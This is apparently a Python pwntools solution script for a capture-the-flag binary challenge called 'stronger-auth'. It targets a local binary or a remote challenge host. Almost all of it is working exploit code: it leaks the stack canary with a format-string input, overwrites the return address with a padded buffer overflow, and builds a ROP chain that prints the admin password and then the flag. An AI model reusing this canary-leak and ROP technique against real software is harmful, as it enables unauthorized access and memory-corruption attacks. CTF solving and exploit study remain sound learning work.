from pwn import *

elf = ELF("./chal", checksec=False)
context.binary = elf
context.log_level = 'warn'

if args.REMOTE:
    host = args.HOST or "stronger-auth.chall.uiactf.no"
    port = int(args.PORT or 1337)
    p = remote(host, port)
    print("Using remote")
else:
    p = elf.process()
    print("Using local")

# The ROP chain is as follows:
rop = ROP(elf)

# 1. Call the puts function with the address of the admin_password as an argument
rop.call(elf.symbols["puts"], [elf.symbols["admin_password"]])

# 2. Call the main function to login and get authorized set to 1
rop.call(elf.symbols["main"])

# 3. Call the puts FLAG function now that we have logged in.
rop.call(elf.symbols["FLAG"])

# First leak the canary which we determinated to be at position 13
p.recvuntil(b"Username: ")
p.sendline(b"%13$llx")
canary=p.recvuntil(b"@coolbox", drop=True).strip().decode()
print(f"canary found: {canary}")

# Craft a payload to overwrite the return address with the ROP chain and keep the canary the same.
payload  = flat([
    b"A"* (7*8), # Overwrite the stack until the canary
    int(canary,16), # Insert the leaked canary
    b"B"*8, # 8 bytes for something, not sure
    rop.chain() # Insert the ROP chain at the RET address.
])

# Execute the payload
p.recvuntil(b"password: ")
print(f"sending payload: {payload.hex()}")
p.sendline(payload)

# Wait  for the first disconnected where our ROP chain puts the admin_password on return.
p.recvuntil(b"DISCONNECTED!");
password=p.recvline().strip()
print(f"password found: {password.decode()}")

# Now ROP chain goes to main and we can login:
p.recvuntil(b"Username: ")
p.sendline(b"admin")
p.recvuntil(b"password: ")
p.sendline(password)

# Now the ROP chain goes to FLAG and we get the flag:
print(f"flag found?: {p.recvall().decode().strip()}")